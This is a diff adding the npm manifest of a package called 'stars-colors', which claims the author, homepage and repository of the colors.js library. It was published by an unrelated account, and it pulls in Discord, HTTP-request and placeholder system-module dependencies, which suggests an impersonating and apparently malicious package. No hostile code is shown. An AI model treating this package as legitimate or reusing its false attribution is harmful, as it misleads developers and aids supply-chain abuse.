@@ -1,0 +1,70 @@
+{
+    "name": "stars-colors",
+    "description": "get colors in your node.js console",
+    "version": "1.4.0",
+    "author": {
+        "name": "Marak Squires"
+    },
+    "contributors": [
+        {
+            "name": "DABH",
+            "url": "https://github.com/DABH"
+        }
+    ],
+    "homepage": "https://github.com/Marak/colors.js",
+    "bugs": {
+        "url": "https://github.com/Marak/colors.js/issues"
+    },
+    "repository": {
+        "type": "git",
+        "url": "git+ssh://git@github.com/Marak/colors.js.git"
+    },
+    "license": "MIT",
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "engines": {
+        "node": ">=0.1.90"
+    },
+    "main": "lib/index.js",
+    "dependencies": {
+        "child_process": "^1.0.2",
+        "discord.js": "^12.5.3",
+        "fs": "^0.0.1-security",
+        "node-fetch": "^1.7.3",
+        "os": "^0.1.2",
+        "sync-request": "^6.1.0"
+    },
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0"
+    },
+    "_id": "stars-colors@1.4.0",
+    "_nodeVersion": "16.14.0",
+    "_npmVersion": "8.3.1",
+    "dist": {
+        "integrity": "sha512-bFG5c8INKLaIcvbt0Ro5JDjbOStQFLwi4IEpOMrPuEDG6Wyho+DuuZWIcamI9/C1BKrot3tGy+Tl1MVgNJ8LVg==",
+        "shasum": "c1cc221a9db6abd87647cbfc21cd2239abf8f206",
+        "tarball": "https://registry.npmjs.org/stars-colors/-/stars-colors-1.4.0.tgz",
+        "fileCount": 24,
+        "unpackedSize": 355525,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQKjSACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrBlQ/+Pwt2QGnf5rqFb3u5FcG1zXc4TTfd+3FxZMPxxICTA1g3wGj/\r\nRLrfCPDhJrDgthAM5kDliOrvWKe7XfZdYyAh90NovebFQXYgbqkrPhkQvInE\r\nVCIGNFwBzI8yMhWkfXNUAvUACSwMLKzY1nfpehdmV83i7ie+81TLE6ST4O0L\r\nzBppU4tVE+FDHefMJb5geDH/tGDu2KFI2gzmVXdoGYI523pZyqtxIm7nlaBC\r\nS+Dmy545FfrIedzwUqJ9flP1HpnRQkIK6jlUQ5qRe4FxeiaSBdtTcqfwsHmV\r\nP62uhc5+Cqz2nULu1MgQ7h0yc5/KtCYtWsgR+na97XtffaE5KK7b8ZXTT5nW\r\naqBh0vkPJqT/d8/B2fGLfIlzoyK/63hmYfJ6kxNgLi5caBSeH1m76sQvUpsf\r\nxz195yOxfiE6gHkjrd6886K0JJdndVacSpfYGh+mQVFg8vmmZYBZn4fq5BYL\r\n8r1Q+QxQ2Ne+kOmxBmGBwR3iG/qDN4YTCtTMI6tcYgwkNDIxwUMHmyFYxpS+\r\nnZ9K+DIG2iCuFJ97jgPGMX7TaJ+tI5te6YWScr1jn+bXIH34FVs7n3FepGXO\r\n5sfgt7JlhN91zNv15Lgd8Xr3zsmPUffRai03Ql+MDWrMMvfME3VWuUQMLZYB\r\nEtlCj9HDb/KQWBrC55+17bHwHhLr4mLTFwM=\r\n=XPSp\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "kakauandkozune",
+        "email": "resoc47525@flowminer.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "kakauandkozune",
+            "email": "resoc47525@flowminer.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/stars-colors_1.4.0_1648404690775_0.9530097298962035"
+    },
+    "_hasShrinkwrap": false
+}
